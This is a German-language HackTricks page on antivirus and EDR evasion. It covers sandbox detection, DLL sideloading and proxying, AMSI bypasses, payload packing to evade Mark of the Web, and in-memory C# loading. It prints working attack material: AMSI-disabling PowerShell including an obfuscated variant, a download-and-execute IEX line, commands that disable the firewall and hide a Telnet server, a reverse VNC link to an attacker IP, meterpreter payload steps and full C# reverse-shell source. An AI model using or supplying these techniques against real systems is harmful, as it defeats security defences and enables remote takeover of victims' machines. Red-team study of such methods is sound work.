# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Diese Seite wurde geschrieben von** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## **AV Evasion Methodology**

Derzeit verwenden AVs verschiedene Methoden, um zu überprüfen, ob eine Datei bösartig ist oder nicht: statische Erkennung, dynamische Analyse und für die fortschrittlicheren EDRs, Verhaltensanalyse.

### **Statische Erkennung**

Die statische Erkennung erfolgt durch das Markieren bekannter bösartiger Zeichenfolgen oder Byte-Arrays in einer Binärdatei oder einem Skript sowie durch das Extrahieren von Informationen aus der Datei selbst (z. B. Dateibeschreibung, Firmenname, digitale Signaturen, Icon, Prüfziffer usw.). Das bedeutet, dass die Verwendung bekannter öffentlicher Tools dazu führen kann, dass Sie leichter erwischt werden, da sie wahrscheinlich analysiert und als bösartig markiert wurden. Es gibt ein paar Möglichkeiten, diese Art der Erkennung zu umgehen:

- **Verschlüsselung**

Wenn Sie die Binärdatei verschlüsseln, gibt es keine Möglichkeit für AV, Ihr Programm zu erkennen, aber Sie benötigen eine Art Loader, um das Programm im Speicher zu entschlüsseln und auszuführen.

- **Obfuskation**

Manchmal müssen Sie nur einige Zeichenfolgen in Ihrer Binärdatei oder Ihrem Skript ändern, um an AV vorbeizukommen, aber dies kann je nach dem, was Sie obfuskieren möchten, eine zeitaufwändige Aufgabe sein.

- **Eigene Tools**

Wenn Sie Ihre eigenen Tools entwickeln, gibt es keine bekannten schlechten Signaturen, aber das erfordert viel Zeit und Mühe.

> [!NOTE]
> Eine gute Möglichkeit, die statische Erkennung von Windows Defender zu überprüfen, ist [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Es teilt die Datei im Grunde in mehrere Segmente auf und fordert Defender auf, jedes einzeln zu scannen. So kann es Ihnen genau sagen, welche Zeichenfolgen oder Bytes in Ihrer Binärdatei markiert sind.

Ich empfehle Ihnen dringend, diese [YouTube-Playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) über praktische AV-Evasion anzusehen.

### **Dynamische Analyse**

Die dynamische Analyse erfolgt, wenn das AV Ihre Binärdatei in einer Sandbox ausführt und nach bösartiger Aktivität Ausschau hält (z. B. versucht, die Passwörter Ihres Browsers zu entschlüsseln und zu lesen, einen Minidump von LSASS durchzuführen usw.). Dieser Teil kann etwas kniffliger sein, aber hier sind einige Dinge, die Sie tun können, um Sandboxes zu umgehen.

- **Schlaf vor der Ausführung** Je nach Implementierung kann dies eine großartige Möglichkeit sein, die dynamische Analyse von AVs zu umgehen. AVs haben sehr wenig Zeit, um Dateien zu scannen, um den Arbeitsablauf des Benutzers nicht zu unterbrechen, daher können lange Schlafzeiten die Analyse von Binärdateien stören. Das Problem ist, dass viele AV-Sandboxes den Schlaf je nach Implementierung einfach überspringen können.
- **Überprüfung der Ressourcen des Systems** Normalerweise haben Sandboxes sehr wenig Ressourcen zur Verfügung (z. B. < 2 GB RAM), da sie sonst die Maschine des Benutzers verlangsamen könnten. Hier können Sie auch sehr kreativ werden, indem Sie beispielsweise die CPU-Temperatur oder sogar die Lüftergeschwindigkeiten überprüfen; nicht alles wird in der Sandbox implementiert.
- **Maschinenspezifische Überprüfungen** Wenn Sie einen Benutzer ansprechen möchten, dessen Arbeitsstation mit der Domäne "contoso.local" verbunden ist, können Sie eine Überprüfung der Domäne des Computers durchführen, um zu sehen, ob sie mit der von Ihnen angegebenen übereinstimmt. Wenn nicht, können Sie Ihr Programm beenden.

Es stellt sich heraus, dass der Computername der Sandbox von Microsoft Defender HAL9TH ist. Sie können also den Computernamen in Ihrer Malware vor der Detonation überprüfen. Wenn der Name mit HAL9TH übereinstimmt, bedeutet das, dass Sie sich in der Sandbox von Defender befinden, und Sie können Ihr Programm beenden.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>Quelle: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Einige andere wirklich gute Tipps von [@mgeeky](https://twitter.com/mariuszbit) für den Umgang mit Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev Kanal</p></figcaption></figure>

Wie bereits in diesem Beitrag erwähnt, werden **öffentliche Tools** letztendlich **erkannt**, also sollten Sie sich etwas fragen:

Wenn Sie beispielsweise LSASS dumpen möchten, **müssen Sie wirklich mimikatz verwenden**? Oder könnten Sie ein anderes, weniger bekanntes Projekt verwenden, das ebenfalls LSASS dumpen kann.

Die richtige Antwort ist wahrscheinlich Letzteres. Wenn man mimikatz als Beispiel nimmt, ist es wahrscheinlich eines der, wenn nicht das am häufigsten markierte Stück Malware von AVs und EDRs. Während das Projekt selbst super cool ist, ist es auch ein Albtraum, damit zu arbeiten, um an AVs vorbeizukommen. Suchen Sie also einfach nach Alternativen für das, was Sie erreichen möchten.

> [!NOTE]
> Wenn Sie Ihre Payloads zur Umgehung modifizieren, stellen Sie sicher, dass Sie **die automatische Probenübermittlung** in Defender deaktivieren, und bitte, ernsthaft, **LADEN SIE NICHT AUF VIRUSTOTAL HOCH**, wenn Ihr Ziel darin besteht, langfristig eine Umgehung zu erreichen. Wenn Sie überprüfen möchten, ob Ihre Payload von einem bestimmten AV erkannt wird, installieren Sie es auf einer VM, versuchen Sie, die automatische Probenübermittlung auszuschalten, und testen Sie es dort, bis Sie mit dem Ergebnis zufrieden sind.

## EXEs vs DLLs

Wann immer es möglich ist, **priorisieren Sie die Verwendung von DLLs zur Umgehung**. Meiner Erfahrung nach werden DLL-Dateien in der Regel **deutlich weniger erkannt** und analysiert, sodass es ein sehr einfacher Trick ist, um in einigen Fällen eine Erkennung zu vermeiden (wenn Ihre Payload natürlich eine Möglichkeit hat, als DLL ausgeführt zu werden).

Wie wir in diesem Bild sehen können, hat eine DLL-Payload von Havoc eine Erkennungsrate von 4/26 in antiscan.me, während die EXE-Payload eine Erkennungsrate von 7/26 hat.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me Vergleich einer normalen Havoc EXE-Payload vs einer normalen Havoc DLL</p></figcaption></figure>

Jetzt zeigen wir einige Tricks, die Sie mit DLL-Dateien verwenden können, um viel stealthier zu sein.

## DLL Sideloading & Proxying

**DLL Sideloading** nutzt die DLL-Suchreihenfolge des Loaders aus, indem sowohl die Zielanwendung als auch die bösartigen Payload(s) nebeneinander positioniert werden.

Sie können Programme, die anfällig für DLL Sideloading sind, mit [Siofra](https://github.com/Cybereason/siofra) und dem folgenden PowerShell-Skript überprüfen:
```powershell
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Dieser Befehl gibt die Liste der Programme aus, die anfällig für DLL-Hijacking in "C:\Program Files\\" sind, sowie die DLL-Dateien, die sie zu laden versuchen.

Ich empfehle Ihnen dringend, **DLL-hijackbare/sideloadbare Programme selbst zu erkunden**. Diese Technik ist ziemlich heimlich, wenn sie richtig durchgeführt wird, aber wenn Sie öffentlich bekannte DLL-sideloadbare Programme verwenden, könnten Sie leicht erwischt werden.

Allein durch das Platzieren einer bösartigen DLL mit dem Namen, den ein Programm erwartet zu laden, wird Ihre Payload nicht geladen, da das Programm einige spezifische Funktionen innerhalb dieser DLL erwartet. Um dieses Problem zu beheben, verwenden wir eine andere Technik namens **DLL-Proxying/Forwarding**.

**DLL-Proxying** leitet die Aufrufe, die ein Programm von der Proxy- (und bösartigen) DLL an die ursprüngliche DLL macht, weiter und bewahrt so die Funktionalität des Programms und kann die Ausführung Ihrer Payload handhaben.

Ich werde das [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) Projekt von [@flangvik](https://twitter.com/Flangvik/) verwenden.

Dies sind die Schritte, die ich befolgt habe:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Der letzte Befehl gibt uns 2 Dateien: eine DLL-Quellcodevorlage und die original umbenannte DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Sowohl unser Shellcode (kodiert mit [SGN](https://github.com/EgeBalci/sgn)) als auch die Proxy-DLL haben eine Erkennungsrate von 0/26 in [antiscan.me](https://antiscan.me)! Ich würde das als Erfolg bezeichnen.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!NOTE]
> Ich **empfehle dringend**, dass Sie [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) über DLL Sideloading ansehen und auch [ippsec's Video](https://www.youtube.com/watch?v=3eROsG_WNpE), um mehr über das, was wir ausführlicher besprochen haben, zu erfahren.

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze ist ein Payload-Toolkit zum Umgehen von EDRs unter Verwendung von angehaltenen Prozessen, direkten Syscalls und alternativen Ausführungsmethoden`

Sie können Freeze verwenden, um Ihren Shellcode auf eine stealthy Weise zu laden und auszuführen.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!NOTE]
> Umgehung ist nur ein Katz-und-Maus-Spiel, was heute funktioniert, könnte morgen erkannt werden, also verlasse dich niemals nur auf ein Werkzeug. Wenn möglich, versuche, mehrere Umgehungstechniken zu kombinieren.

## AMSI (Anti-Malware Scan Interface)

AMSI wurde geschaffen, um "[dateilose Malware](https://en.wikipedia.org/wiki/Fileless_malware)" zu verhindern. Zunächst waren AVs nur in der Lage, **Dateien auf der Festplatte** zu scannen, sodass, wenn du es irgendwie schaffen konntest, Payloads **direkt im Speicher** auszuführen, der AV nichts tun konnte, um dies zu verhindern, da er nicht genügend Sichtbarkeit hatte.

Die AMSI-Funktion ist in diese Komponenten von Windows integriert.

- Benutzerkontensteuerung oder UAC (Erhöhung von EXE, COM, MSI oder ActiveX-Installation)
- PowerShell (Skripte, interaktive Nutzung und dynamische Codeauswertung)
- Windows Script Host (wscript.exe und cscript.exe)
- JavaScript und VBScript
- Office VBA-Makros

Es ermöglicht Antivirenlösungen, das Verhalten von Skripten zu inspizieren, indem der Skriptinhalt in einer Form offengelegt wird, die sowohl unverschlüsselt als auch nicht obfuskiert ist.

Die Ausführung von `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` wird den folgenden Alarm in Windows Defender erzeugen.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Beachte, wie es `amsi:` voranstellt und dann den Pfad zur ausführbaren Datei, von der das Skript ausgeführt wurde, in diesem Fall powershell.exe.

Wir haben keine Datei auf die Festplatte geschrieben, wurden aber trotzdem im Speicher aufgrund von AMSI erwischt.

Es gibt ein paar Möglichkeiten, um AMSI zu umgehen:

- **Obfuskation**

Da AMSI hauptsächlich mit statischen Erkennungen arbeitet, kann das Modifizieren der Skripte, die du zu laden versuchst, eine gute Möglichkeit sein, um die Erkennung zu umgehen.

Allerdings hat AMSI die Fähigkeit, Skripte zu deobfuskieren, selbst wenn sie mehrere Schichten haben, sodass Obfuskation je nach Ausführung eine schlechte Option sein könnte. Das macht es nicht so einfach, zu entkommen. Obwohl manchmal alles, was du tun musst, darin besteht, ein paar Variablennamen zu ändern, und du bist auf der sicheren Seite, also hängt es davon ab, wie stark etwas markiert wurde.

- **AMSI-Umgehung**

Da AMSI implementiert ist, indem eine DLL in den PowerShell (auch cscript.exe, wscript.exe usw.) Prozess geladen wird, ist es möglich, damit einfach zu manipulieren, selbst wenn man als unprivilegierter Benutzer läuft. Aufgrund dieses Fehlers in der Implementierung von AMSI haben Forscher mehrere Möglichkeiten gefunden, um die AMSI-Überprüfung zu umgehen.

**Einen Fehler erzwingen**

Das Erzwingen des Fehlers bei der AMSI-Initialisierung (amsiInitFailed) führt dazu, dass für den aktuellen Prozess kein Scan initiiert wird. Ursprünglich wurde dies von [Matt Graeber](https://twitter.com/mattifestation) offengelegt, und Microsoft hat eine Signatur entwickelt, um eine breitere Nutzung zu verhindern.
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Alles, was nötig war, war eine Zeile PowerShell-Code, um AMSI für den aktuellen PowerShell-Prozess unbrauchbar zu machen. Diese Zeile wurde natürlich von AMSI selbst markiert, daher sind einige Modifikationen erforderlich, um diese Technik zu verwenden.

Hier ist ein modifizierter AMSI-Bypass, den ich aus diesem [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) entnommen habe.
```powershell
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Beachte, dass dieser Beitrag wahrscheinlich markiert wird, sobald er veröffentlicht wird, also solltest du keinen Code veröffentlichen, wenn dein Plan darin besteht, unentdeckt zu bleiben.

**Memory Patching**

Diese Technik wurde ursprünglich von [@RastaMouse](https://twitter.com/_RastaMouse/) entdeckt und beinhaltet das Finden der Adresse der Funktion "AmsiScanBuffer" in amsi.dll (verantwortlich für das Scannen der vom Benutzer bereitgestellten Eingaben) und das Überschreiben mit Anweisungen, um den Code für E_INVALIDARG zurückzugeben. Auf diese Weise wird das Ergebnis des tatsächlichen Scans 0 zurückgeben, was als sauberes Ergebnis interpretiert wird.

> [!NOTE]
> Bitte lies [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) für eine detailliertere Erklärung.

Es gibt auch viele andere Techniken, die verwendet werden, um AMSI mit PowerShell zu umgehen. Schau dir [**diese Seite**](basic-powershell-for-pentesters/index.html#amsi-bypass) und [dieses Repo](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) an, um mehr darüber zu erfahren.

Oder dieses Skript, das über Memory Patching jede neue PowerShell patcht.

## Obfuscation

Es gibt mehrere Tools, die verwendet werden können, um **C# Klartextcode zu obfuskieren**, **Metaprogrammierungsvorlagen** zu generieren, um Binärdateien zu kompilieren oder **kompilierte Binärdateien zu obfuskieren**, wie zum Beispiel:

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# Obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Ziel dieses Projekts ist es, einen Open-Source-Fork der [LLVM](http://www.llvm.org/) Kompilierungs-Suite bereitzustellen, der erhöhte Software-Sicherheit durch [Code-Obfuskation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) und Manipulationssicherheit bietet.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstriert, wie man die Sprache `C++11/14` verwendet, um zur Compile-Zeit obfuskierten Code zu generieren, ohne externe Tools zu verwenden und ohne den Compiler zu modifizieren.
- [**obfy**](https://github.com/fritzone/obfy): Fügt eine Schicht obfuskierten Operationen hinzu, die durch das C++-Template-Metaprogrammierungs-Framework generiert werden, was das Leben der Person, die die Anwendung knacken möchte, ein wenig schwieriger macht.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ist ein x64-Binär-Obfuscator, der in der Lage ist, verschiedene PE-Dateien zu obfuskieren, einschließlich: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame ist eine einfache metamorphe Code-Engine für beliebige ausführbare Dateien.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ist ein feingranulares Code-Obfuskations-Framework für LLVM-unterstützte Sprachen, das ROP (return-oriented programming) verwendet. ROPfuscator obfuskiert ein Programm auf der Ebene des Assemblercodes, indem reguläre Anweisungen in ROP-Ketten umgewandelt werden, was unser natürliches Verständnis des normalen Kontrollflusses untergräbt.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt ist ein .NET PE Crypter, der in Nim geschrieben ist.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor kann vorhandene EXE/DLL in Shellcode umwandeln und sie dann laden.

## SmartScreen & MoTW

Du hast vielleicht diesen Bildschirm gesehen, als du einige ausführbare Dateien aus dem Internet heruntergeladen und ausgeführt hast.

Microsoft Defender SmartScreen ist ein Sicherheitsmechanismus, der dazu dient, den Endbenutzer vor dem Ausführen potenziell schädlicher Anwendungen zu schützen.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen funktioniert hauptsächlich mit einem reputationsbasierten Ansatz, was bedeutet, dass ungewöhnlich heruntergeladene Anwendungen SmartScreen auslösen und den Endbenutzer daran hindern, die Datei auszuführen (obwohl die Datei weiterhin ausgeführt werden kann, indem man auf Mehr Informationen -> Trotzdem ausführen klickt).

**MoTW** (Mark of The Web) ist ein [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) mit dem Namen Zone.Identifier, der automatisch beim Herunterladen von Dateien aus dem Internet erstellt wird, zusammen mit der URL, von der sie heruntergeladen wurden.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Überprüfung des Zone.Identifier ADS für eine aus dem Internet heruntergeladene Datei.</p></figcaption></figure>

> [!NOTE]
> Es ist wichtig zu beachten, dass ausführbare Dateien, die mit einem **vertrauenswürdigen** Signaturzertifikat signiert sind, **SmartScreen nicht auslösen**.

Eine sehr effektive Möglichkeit, um zu verhindern, dass deine Payloads das Mark of The Web erhalten, besteht darin, sie in eine Art Container wie eine ISO zu verpacken. Dies geschieht, weil das Mark-of-the-Web (MOTW) **nicht** auf **nicht NTFS** Volumes angewendet werden kann.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) ist ein Tool, das Payloads in Ausgabedateien verpackt, um dem Mark-of-the-Web zu entkommen.

Beispielverwendung:
```powershell
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Hier ist eine Demo zum Umgehen von SmartScreen, indem Payloads in ISO-Dateien verpackt werden, unter Verwendung von [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## C# Assembly Reflection

Das Laden von C#-Binaries im Speicher ist schon seit einiger Zeit bekannt und es ist immer noch eine sehr gute Möglichkeit, Ihre Post-Exploitation-Tools auszuführen, ohne von AV erwischt zu werden.

Da die Payload direkt in den Speicher geladen wird, ohne die Festplatte zu berühren, müssen wir uns nur um das Patchen von AMSI für den gesamten Prozess kümmern.

Die meisten C2-Frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc usw.) bieten bereits die Möglichkeit, C#-Assemblies direkt im Speicher auszuführen, aber es gibt verschiedene Möglichkeiten, dies zu tun:

- **Fork\&Run**

Es beinhaltet **das Erzeugen eines neuen opfernden Prozesses**, injizieren Sie Ihren post-exploitation schädlichen Code in diesen neuen Prozess, führen Sie Ihren schädlichen Code aus und töten Sie den neuen Prozess, wenn Sie fertig sind. Dies hat sowohl Vorteile als auch Nachteile. Der Vorteil der Fork-and-Run-Methode ist, dass die Ausführung **außerhalb** unseres Beacon-Implantatprozesses erfolgt. Das bedeutet, dass, wenn etwas in unserer Post-Exploitation-Aktion schiefgeht oder erwischt wird, die **Wahrscheinlichkeit** viel größer ist, dass unser **Implantat überlebt.** Der Nachteil ist, dass Sie eine **größere Chance** haben, von **verhaltensbasierten Erkennungen** erwischt zu werden.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Es geht darum, den post-exploitation schädlichen Code **in seinen eigenen Prozess** zu injizieren. Auf diese Weise können Sie vermeiden, einen neuen Prozess zu erstellen und ihn von AV scannen zu lassen, aber der Nachteil ist, dass, wenn etwas mit der Ausführung Ihrer Payload schiefgeht, die **Wahrscheinlichkeit** viel größer ist, dass Sie **Ihr Beacon verlieren**, da es abstürzen könnte.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!NOTE]
> Wenn Sie mehr über das Laden von C#-Assemblies lesen möchten, schauen Sie sich bitte diesen Artikel an [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) und deren InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Sie können auch C#-Assemblies **aus PowerShell** laden, schauen Sie sich [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) und [S3cur3th1sSh1t's Video](https://www.youtube.com/watch?v=oe11Q-3Akuk) an.

## Verwendung anderer Programmiersprachen

Wie in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) vorgeschlagen, ist es möglich, schädlichen Code mit anderen Sprachen auszuführen, indem man der kompromittierten Maschine Zugriff **auf die Interpreterumgebung gewährt, die auf dem vom Angreifer kontrollierten SMB-Share installiert ist**.

Indem Sie den Zugriff auf die Interpreter-Binaries und die Umgebung auf dem SMB-Share erlauben, können Sie **beliebigen Code in diesen Sprachen im Speicher** der kompromittierten Maschine **ausführen**.

Das Repo weist darauf hin: Defender scannt weiterhin die Skripte, aber durch die Nutzung von Go, Java, PHP usw. haben wir **mehr Flexibilität, um statische Signaturen zu umgehen**. Tests mit zufälligen, nicht obfuskierten Reverse-Shell-Skripten in diesen Sprachen waren erfolgreich.

## Fortgeschrittene Umgehung

Umgehung ist ein sehr kompliziertes Thema, manchmal müssen Sie viele verschiedene Telemetriequellen in nur einem System berücksichtigen, sodass es ziemlich unmöglich ist, in reifen Umgebungen völlig unentdeckt zu bleiben.

Jede Umgebung, gegen die Sie antreten, hat ihre eigenen Stärken und Schwächen.

Ich empfehle Ihnen dringend, sich diesen Vortrag von [@ATTL4S](https://twitter.com/DaniLJ94) anzusehen, um einen Einblick in fortgeschrittene Umgehungstechniken zu erhalten.

{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Dies ist auch ein weiterer großartiger Vortrag von [@mariuszbit](https://twitter.com/mariuszbit) über Umgehung in der Tiefe.

{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Alte Techniken**

### **Überprüfen, welche Teile Defender als schädlich erkennt**

Sie können [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) verwenden, das **Teile der Binärdatei entfernt**, bis es **herausfindet, welcher Teil von Defender** als schädlich erkannt wird und es Ihnen aufteilt.\
Ein weiteres Tool, das **dasselbe tut, ist** [**avred**](https://github.com/dobin/avred) mit einem offenen Webangebot, das den Dienst in [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) anbietet.

### **Telnet-Server**

Bis Windows 10 kam jede Windows-Version mit einem **Telnet-Server**, den Sie (als Administrator) installieren konnten, indem Sie:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Lassen Sie es **starten**, wenn das System gestartet wird, und **führen** Sie es jetzt aus:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Ändern Sie den Telnet-Port** (stealth) und deaktivieren Sie die Firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Laden Sie es herunter von: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (Sie möchten die Binärdownloads, nicht das Setup)

**AUF DEM HOST**: Führen Sie _**winvnc.exe**_ aus und konfigurieren Sie den Server:

- Aktivieren Sie die Option _Disable TrayIcon_
- Setzen Sie ein Passwort in _VNC Password_
- Setzen Sie ein Passwort in _View-Only Password_

Verschieben Sie dann die Binärdatei _**winvnc.exe**_ und die **neu** erstellte Datei _**UltraVNC.ini**_ in die **Opfer**

#### **Reverse-Verbindung**

Der **Angreifer** sollte **innerhalb** seines **Hosts** die Binärdatei `vncviewer.exe -listen 5900` ausführen, damit sie **vorbereitet** ist, eine umgekehrte **VNC-Verbindung** zu empfangen. Dann, innerhalb des **Opfers**: Starten Sie den winvnc-Daemon `winvnc.exe -run` und führen Sie `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` aus.

**WARNUNG:** Um die Tarnung zu wahren, dürfen Sie einige Dinge nicht tun

- Starten Sie `winvnc` nicht, wenn es bereits läuft, oder Sie lösen ein [Popup](https://i.imgur.com/1SROTTl.png) aus. Überprüfen Sie, ob es läuft mit `tasklist | findstr winvnc`
- Starten Sie `winvnc` nicht ohne `UltraVNC.ini` im selben Verzeichnis, da dies [das Konfigurationsfenster](https://i.imgur.com/rfMQWcf.png) öffnet
- Führen Sie `winvnc -h` nicht zur Hilfe aus, oder Sie lösen ein [Popup](https://i.imgur.com/oc18wcu.png) aus

### GreatSCT

Laden Sie es herunter von: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Innerhalb von GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Jetzt **starten Sie den Lister** mit `msfconsole -r file.rc` und **führen Sie** die **xml Payload** mit aus:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Der aktuelle Defender wird den Prozess sehr schnell beenden.**

### Unser eigenes Reverse Shell kompilieren

https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Erste C# Revershell

Kompilieren Sie es mit:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Verwenden Sie es mit:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# unter Verwendung des Compilers
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
